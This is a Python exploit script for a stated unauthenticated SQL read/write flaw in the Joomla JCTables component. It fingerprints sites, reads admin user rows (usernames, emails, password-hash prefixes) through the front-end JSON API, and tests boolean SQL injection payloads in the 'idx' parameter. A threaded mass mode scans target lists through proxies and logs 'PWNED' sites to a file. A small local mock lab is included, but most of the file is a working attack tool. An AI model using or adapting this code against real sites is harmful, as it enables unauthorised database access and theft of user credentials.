#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-76570 — Joomcode JCTables (com_jctables) < 1.21.1
Unauthenticated SQL read/write via front-end JSON CRUD API (missing auth + broken ladb_escape).
CNA: Joomla! Project (PUBLISHED 2026-09-30). CVSS:4.0 10.0 / CWE-89, CWE-862.

Reference: https://www.vulncheck.com/blog/jctables-unauthenticated-sql-rw-to-rce
"""

from __future__ import annotations

CVE_ID = "CVE-2026-76570"
POC_TITLE = "JCTables unauthenticated SQL read/write (com_jctables)"
VENDOR = "joomcode.com"
COMPONENT = "com_jctables"
PRODUCT = "JCTables Extension For Joomla"
FIX_VERSION = (1, 21, 1)
AFFECTED_RANGE = "1.0.0-1.20.0"
CVE_STATE = "PUBLISHED"
CVE_PUBLISHED = "2026-09-30"
CVSS_V4_SCORE = 10.0
CVSS_V4_VECTOR = (
    "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:A/AU:Y"
)
CWE_ID = "CWE-89"
CVE_RECORD_URL = "https://www.cve.org/CVERecord?id=CVE-2026-76570"
NVD_URL = "https://nvd.nist.gov/vuln/detail/CVE-2026-76570"

POCBIT_HOME = "https://pocbit.org"
POCBIT_CATALOG = f"{POCBIT_HOME}/pocs/"
POCBIT_PAGE = f"{POCBIT_HOME}/pocs/{CVE_ID.lower()}"
VERIFY_MARKER = "POCBIT-76570-OK"

WAF_HINTS = (
    "one moment, please",
    "cf-challenge",
    "just a moment",
    "checking your browser",
    "ddos-guard",
)

import argparse
import json
import re
import sys
import threading
import time
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from urllib.parse import urlencode, urljoin, urlparse

try:
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass

import requests
from requests.adapters import HTTPAdapter

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 "
    f"PoCbit (+{POCBIT_HOME})"
)

MANIFEST_PATHS = (
    "/administrator/components/com_jctables/jctables.xml",
    "/administrator/components/com_jctables/com_jctables.xml",
    "/administrator/components/com_jctables/jctables.xml",
)
COMPONENT_HINTS = (
    "/components/com_jctables/",
    "/media/com_jctables/",
    "/administrator/components/com_jctables/",
)
VER_RE = re.compile(r"<version>\s*([\d.]+)\s*</version>", re.I)

COMMON_DB_PREFIXES = (
    "jos_",
    "joom_",
    "j25_",
    "j30_",
    "joomla_",
    "site_",
    "db_",
    "wp_",
    "demo_",
    "test_",
    "j_",
)

BCRYPT_RE = re.compile(r"\$2[ayb]\$.{50,}")
USER_FIELD_HINTS = ("username", "password", "email", "name")

print_lock = threading.Lock()
_use_color = True


class Col:
    RST = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"


def paint(s, *styles):
    if not _use_color or not styles:
        return s
    return "".join(styles) + s + Col.RST


def log(msg, *styles):
    with print_lock:
        print(paint(msg, *styles) if styles else msg, flush=True)


def log_ok(m):
    log(m, Col.GREEN, Col.BOLD)


def log_fail(m):
    log(m, Col.RED)


def _finish_row(row):
    out = dict(row)
    out["pocbit_page"] = POCBIT_PAGE
    out["cve"] = CVE_ID
    out["cve_state"] = CVE_STATE
    out["cve_record"] = CVE_RECORD_URL
    out["nvd"] = NVD_URL
    out["vendor"] = VENDOR
    out["component"] = COMPONENT
    out["product"] = PRODUCT
    out["affected_range"] = AFFECTED_RANGE
    out["fix_version"] = ".".join(str(x) for x in FIX_VERSION)
    out["cwe"] = CWE_ID
    out["cvss_v4_score"] = CVSS_V4_SCORE
    out["cvss_v4_vector"] = CVSS_V4_VECTOR
    out["attack_requirements"] = (
        "AT:N — com_jctables front-end JSON API reachable; affected build < 1.21.1"
    )
    return out


def normalize_base(raw):
    if not raw or not str(raw).strip():
        return None
    s = str(raw).strip().split("#")[0].split("?")[0].strip()
    if not s:
        return None
    if not re.match(r"^https?://", s, re.I):
        s = "https://" + s
    p = urlparse(s)
    if not p.netloc:
        return None
    return f"{p.scheme}://{p.netloc}"


def mk_session(timeout, proxy):
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*"})
    s.verify = False
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    adapter = HTTPAdapter(max_retries=0, pool_maxsize=20)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.request_timeout = timeout

    def _req(method, url, **kw):
        kw.setdefault("timeout", timeout)
        return s.request(method, url, **kw)

    s.get = lambda url, **kw: _req("GET", url, **kw)
    s.post = lambda url, **kw: _req("POST", url, **kw)
    return s


def get(s, url):
    return s.get(url, allow_redirects=True)


def parse_version_tuple(text):
    if not text:
        return None
    m = VER_RE.search(text)
    if not m:
        return None
    parts = []
    for seg in m.group(1).strip().split("."):
        try:
            parts.append(int(seg))
        except ValueError:
            break
    return tuple(parts) if parts else None


def version_tuple_lt(vt, fix=FIX_VERSION):
    if not vt:
        return None
    a = list(vt) + [0] * (4 - len(vt))
    b = list(fix) + [0] * (4 - len(fix))
    return tuple(a[:4]) < tuple(b[:4])


def detect_component(s, base):
    hints = []
    for path in COMPONENT_HINTS:
        try:
            r = get(s, urljoin(base + "/", path.lstrip("/")))
            if r.status_code in (200, 403, 301, 302):
                hints.append(path)
        except requests.RequestException:
            pass
    try:
        if "com_jctables" in (get(s, base + "/").text or "").lower():
            hints.append("homepage")
    except requests.RequestException:
        pass
    return bool(hints), hints


def fetch_version(s, base):
    for path in MANIFEST_PATHS:
        try:
            r = get(s, base + path)
            if r.status_code == 200 and "<version>" in (r.text or ""):
                vt = parse_version_tuple(r.text)
                ver = ".".join(str(x) for x in vt) if vt else None
                return ver, vt, path
        except requests.RequestException:
            pass
    return None, None, None


def build_api_url(base, task, params=None):
    q = {"option": COMPONENT, "format": "json", "task": task}
    if params:
        q.update({k: v for k, v in params.items() if v is not None})
    return base.rstrip("/") + "/index.php?" + urlencode(q, doseq=True)


def _waf_block(body):
    if not body:
        return False
    low = body.lower()
    return any(h in low for h in WAF_HINTS)


def _parse_json_body(text):
    if not text or _waf_block(text):
        return None
    text = text.strip()
    if not text.startswith("{"):
        return None
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        return None


def _data_payload(j):
    if not isinstance(j, dict):
        return None
    data = j.get("data")
    if isinstance(data, dict) and data:
        return data
    if isinstance(data, list) and data and isinstance(data[0], dict):
        return data[0]
    return None


def _looks_like_user_row(data):
    if not isinstance(data, dict):
        return False
    keys = {k.lower() for k in data.keys()}
    if not keys.intersection(USER_FIELD_HINTS):
        return False
    user = data.get("username") or data.get("name")
    pwd = data.get("password") or ""
    if user and (BCRYPT_RE.search(str(pwd)) or data.get("email")):
        return True
    return bool(user and "id" in keys)


def _json_has_rows(j):
    if not isinstance(j, dict):
        return False
    data = j.get("data")
    if isinstance(data, list) and len(data) > 0:
        inner = data[0]
        if isinstance(inner, list) and len(inner) > 0:
            return True
        if isinstance(inner, dict) and inner:
            return True
    if isinstance(data, dict) and data:
        return True
    return False


def try_getdatarow_users(s, base, prefix, user_id=1):
    tn = f"{prefix}users"
    url = build_api_url(
        base,
        "getdatarow",
        {"tn": tn, "idx": "id", "rid": str(user_id)},
    )
    attempts = [{"task": "getdatarow", "url": url, "prefix": prefix, "rid": user_id}]
    try:
        r = get(s, url)
        attempts[0]["status"] = r.status_code
        attempts[0]["len"] = len(r.text or "")
        j = _parse_json_body(r.text or "")
        if not j:
            return False, None, attempts
        if "Invalid security token" in (r.text or ""):
            attempts[0]["note"] = "token_required_write_or_patched_api"
            return False, None, attempts
        data = _data_payload(j)
        if _looks_like_user_row(data):
            proof = {
                "vector": "getdatarow_arbitrary_table",
                "table": tn,
                "prefix": prefix,
                "user_id": user_id,
                "username": data.get("username") or data.get("name"),
                "email": data.get("email"),
                "password_prefix": (str(data.get("password") or "")[:7] + "…")
                if data.get("password")
                else None,
                "verify_marker": VERIFY_MARKER,
            }
            return True, proof, attempts
    except requests.RequestException as e:
        attempts[0]["error"] = str(e)
    return False, None, attempts


def try_boolean_getrow(s, base, mid, tid):
    params_base = {"mid": str(mid), "tid": str(tid), "task": "getrow"}
    idx_true = "'' OR (1=1) OR ''"
    idx_false = "'' OR (1=2) OR ''"
    attempts = []
    results = {}
    for label, idx in (("true", idx_true), ("false", idx_false)):
        url = build_api_url(base, "getrow", {**params_base, "idx": idx})
        try:
            r = get(s, url)
            j = _parse_json_body(r.text or "")
            attempts.append(
                {
                    "task": "getrow",
                    "label": label,
                    "mid": mid,
                    "tid": tid,
                    "status": r.status_code,
                    "len": len(r.text or ""),
                }
            )
            results[label] = _json_has_rows(j) if j else False
        except requests.RequestException as e:
            attempts.append({"task": "getrow", "label": label, "error": str(e)})
            results[label] = None
    if results.get("true") is True and results.get("false") is False:
        return True, {
            "vector": "getrow_boolean_sqli",
            "mid": mid,
            "tid": tid,
            "verify_marker": VERIFY_MARKER,
        }, attempts
    return False, None, attempts


def probe_api_reachable(s, base):
    url = build_api_url(base, "getdatarow", {"tn": "x", "idx": "id", "rid": "1"})
    try:
        r = get(s, url)
        if r.status_code == 404:
            return False, "http_404"
        body = r.text or ""
        if _waf_block(body):
            return False, "waf"
        if "com_jctables" in body.lower() or body.strip().startswith("{"):
            return True, "json_api"
        return r.status_code < 500, "http_%d" % r.status_code
    except requests.RequestException as e:
        return False, str(e)


def exploit_sql_read(s, base, prefix_hint=None):
    all_attempts = []
    prefixes = [prefix_hint] if prefix_hint else []
    for p in COMMON_DB_PREFIXES:
        if p not in prefixes:
            prefixes.append(p)

    for prefix in prefixes:
        if not prefix:
            continue
        for uid in (1, 2, 42, 24):
            ok, proof, att = try_getdatarow_users(s, base, prefix, uid)
            all_attempts.extend(att)
            if ok:
                return proof, "sqli_confirmed", all_attempts[:20]

    for mid in range(1, 8):
        for tid in range(0, 4):
            ok, proof, att = try_boolean_getrow(s, base, mid, tid)
            all_attempts.extend(att)
            if ok:
                return proof, "sqli_confirmed", all_attempts[:20]

    return {"attempts": all_attempts[:25]}, "exploit_failed", all_attempts


def check_target(raw, timeout, proxy, prefix_hint=None):
    base = normalize_base(raw)
    row = _finish_row(
        {
            "target": base,
            "mode": "check",
            "exploitable_candidate": False,
            "affected_version": False,
            "status": "inconclusive",
        }
    )
    if not base:
        row["error"] = "invalid_url"
        row["status"] = "invalid_url"
        return row

    s = mk_session(timeout, proxy)
    comp, hints = detect_component(s, base)
    row["jctables"] = comp
    row["component_hints"] = hints
    ver_str, ver_t, ver_path = fetch_version(s, base)
    row["version"] = ver_str
    row["manifest_path"] = ver_path

    if ver_t is not None:
        row["affected_version"] = version_tuple_lt(ver_t)
    elif comp:
        row["affected_version"] = None

    api_ok, api_note = probe_api_reachable(s, base)
    row["api_reachable"] = api_ok
    row["api_note"] = api_note

    if ver_t is not None and not version_tuple_lt(ver_t):
        row["status"] = "patched_gte_1_21_1"
        return row

    if not comp and not api_ok:
        row["status"] = "com_jctables_not_detected"
        return row

    if ver_t is not None and version_tuple_lt(ver_t) and (comp or api_ok):
        row["exploitable_candidate"] = True
        row["status"] = "affected_version_api_exposed"
        return row

    if comp or api_ok:
        row["exploitable_candidate"] = bool(api_ok)
        row["status"] = "jctables_present_version_unknown" if not ver_str else row["status"]
        if row["exploitable_candidate"]:
            row["status"] = "jctables_api_probe_ok_needs_exploit"
    return row


def exploit_target(raw, timeout, proxy, dry_run=False, force=False, prefix_hint=None):
    base = normalize_base(raw)
    row = _finish_row(
        {
            "target": base,
            "mode": "exploit",
            "exploited": False,
            "status": "exploit_failed",
        }
    )
    if not base:
        row["error"] = "invalid_url"
        return row

    s = mk_session(timeout, proxy)
    comp, _ = detect_component(s, base)
    ver_str, ver_t, _ = fetch_version(s, base)
    row["version"] = ver_str
    row["jctables"] = comp

    if not comp and not force:
        api_ok, _ = probe_api_reachable(s, base)
        if not api_ok:
            row["status"] = "com_jctables_not_detected"
            row["error"] = "use --force to try anyway"
            return row

    if ver_t is not None and not version_tuple_lt(ver_t) and not force:
        row["status"] = "patched_gte_1_21_1"
        return row

    if dry_run:
        row["status"] = "dry_run_ready"
        row["probe_url"] = build_api_url(
            base, "getdatarow", {"tn": "PREFIX_users", "idx": "id", "rid": "1"}
        )
        return row

    proof, status, attempts = exploit_sql_read(s, base, prefix_hint=prefix_hint)
    row["attempts"] = attempts[:15]

    if status == "sqli_confirmed":
        row["exploited"] = True
        row["status"] = "unauth_sql_read_confirmed"
        row["hit"] = proof
        row["verify_marker"] = VERIFY_MARKER
        row["impact_note"] = (
            "CVE-2026-76570: unauthenticated getdatarow / getrow SQL primitives; "
            "full DB read/write on affected builds (see VulnCheck advisory)."
        )
        return row

    row["status"] = "no_sqli_on_probed_prefixes"
    row["note"] = (
        "Try --prefix YOUR_ if auto prefix list failed; site may have no configured "
        "JCTables table for getrow blind path."
    )
    return row


def load_targets(path):
    out = []
    seen = set()
    with open(path, "r", encoding="utf-8-sig", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            base = normalize_base(line.split()[0])
            if base and base not in seen:
                seen.add(base)
                out.append(base)
    return out


def run_local_lab(port=8778):
    import http.server
    import socketserver
    from urllib.parse import parse_qs, urlparse as up

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *_a):
            return

        def do_GET(self):
            p = up(self.path)
            q = parse_qs(p.query, keep_blank_values=True)

            if p.path.endswith("/administrator/components/com_jctables/jctables.xml"):
                body = b'<?xml version="1.0"?><extension><version>1.10.31.2</version></extension>'
                self._send(200, "application/xml", body)
                return

            if q.get("option", [""])[0] == "com_jctables" and q.get("format", [""])[0] == "json":
                task = (q.get("task") or [""])[0]
                if task == "getdatarow":
                    tn = (q.get("tn") or [""])[0]
                    if tn.endswith("users"):
                        payload = {
                            "data": {
                                "id": "1",
                                "username": "admin",
                                "email": "admin@lab.local",
                                "password": "$2y$10$labhashfortestPOCBIT76570OKxxxx",
                                "block": "0",
                            }
                        }
                        self._send_json(payload)
                        return
                if task == "getrow":
                    idx = (q.get("idx") or [""])[0]
                    if "1=1" in idx.replace(" ", ""):
                        self._send_json({"data": [[{"id": "1", "col": "x"}]]})
                        return
                    if "1=2" in idx.replace(" ", ""):
                        self._send_json({"data": [[]]})
                        return
                self._send_json({"data": None, "message": "lab"})
                return

            self.send_response(404)
            self.end_headers()

        def _send(self, code, ctype, body):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def _send_json(self, obj):
            body = json.dumps(obj).encode()
            self._send(200, "application/json", body)

    httpd = socketserver.TCPServer(("127.0.0.1", port), Handler)
    httpd.allow_reuse_address = True
    th = threading.Thread(target=httpd.serve_forever, daemon=True)
    th.start()
    base = "http://127.0.0.1:%d" % port
    try:
        row = exploit_target(base, 12, None, force=True, prefix_hint="lab_")
    finally:
        httpd.shutdown()
    row["lab"] = True
    return row


def run_mass(args):
    targets = load_targets(args.list)
    if not targets:
        log_fail("[!] empty target list")
        return
    mode = args.mode
    out_path = args.hits_list if mode == "check" else args.exploited_list
    open(out_path, "w", encoding="utf-8").close()
    stats = {"total": len(targets), "done": 0, "hits": 0, "pwned": 0}
    start = time.time()

    def work(t):
        if mode == "check":
            return check_target(t, args.timeout, args.proxy, prefix_hint=args.prefix)
        return exploit_target(
            t,
            args.timeout,
            args.proxy,
            force=args.force,
            prefix_hint=args.prefix,
        )

    with ThreadPoolExecutor(max_workers=args.jobs) as ex, open(
        out_path, "a", encoding="utf-8"
    ) as out_f:
        futures = {ex.submit(work, t): t for t in targets}
        try:
            while futures:
                done_set, _ = wait(futures, return_when=FIRST_COMPLETED)
                for fut in done_set:
                    futures.pop(fut)
                    row = fut.result()
                    stats["done"] += 1
                    if mode == "check" and row.get("exploitable_candidate"):
                        stats["hits"] += 1
                        out_f.write(
                            "%s\t%s\t%s\n"
                            % (row.get("target"), row.get("status"), row.get("version") or "")
                        )
                        out_f.flush()
                        if not args.quiet:
                            log_ok("[HIT] %s | %s" % (row.get("target"), row.get("status")))
                    elif mode == "exploit" and row.get("exploited"):
                        stats["pwned"] += 1
                        h = row.get("hit") or {}
                        out_f.write(
                            "%s\t%s\tprefix=%s\t%s\tuser=%s\n"
                            % (
                                row.get("target"),
                                h.get("vector"),
                                h.get("prefix") or "",
                                row.get("version") or "",
                                h.get("username") or "",
                            )
                        )
                        out_f.flush()
                        if not args.quiet:
                            log_ok(
                                "[PWNED] %s | %s | %s"
                                % (row.get("target"), h.get("vector"), h.get("username"))
                            )
                    elif not args.quiet and stats["done"] % max(1, len(targets) // 20) == 0:
                        log_fail("[..] %s | %s" % (row.get("target"), row.get("status")))
        except KeyboardInterrupt:
            log_fail("[!] interrupted")

    elapsed = time.time() - start
    log_ok(
        "[*] %s %.0fs | %d/%d | out=%s"
        % (mode.upper(), elapsed, stats["done"], stats["total"], out_path)
    )


def main():
    p = argparse.ArgumentParser(description="%s — %s" % (CVE_ID, POC_TITLE))
    p.add_argument("-u", "--url", help="single target base URL")
    p.add_argument("--list", help="target list file")
    p.add_argument("--check", action="store_true", help="scan mode")
    p.add_argument("--lab", action="store_true", help="local mock API")
    p.add_argument("-j", "--jobs", type=int, default=12)
    p.add_argument("-T", "--timeout", type=int, default=18)
    p.add_argument("--proxy", default=None)
    p.add_argument("--force", action="store_true")
    p.add_argument("--prefix", default=None, help="Joomla DB table prefix (e.g. jos_)")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--hits-list", default="hits.txt")
    p.add_argument("--exploited-list", default="exploited.txt")
    args = p.parse_args()
    args.mode = "check" if args.check else "exploit"

    if args.lab:
        print(json.dumps(run_local_lab(), ensure_ascii=True, indent=2, default=str))
        sys.exit(0)

    if args.url:
        if args.check:
            row = check_target(args.url, args.timeout, args.proxy, prefix_hint=args.prefix)
        else:
            row = exploit_target(
                args.url,
                args.timeout,
                args.proxy,
                dry_run=args.dry_run,
                force=args.force,
                prefix_hint=args.prefix,
            )
        print(json.dumps(row, ensure_ascii=True, indent=2, default=str))
        sys.exit(0 if (row.get("exploited") or row.get("exploitable_candidate")) else 1)

    if args.list:
        run_mass(args)
        sys.exit(0)

    p.print_help()
    sys.exit(1)


if __name__ == "__main__":
    main()
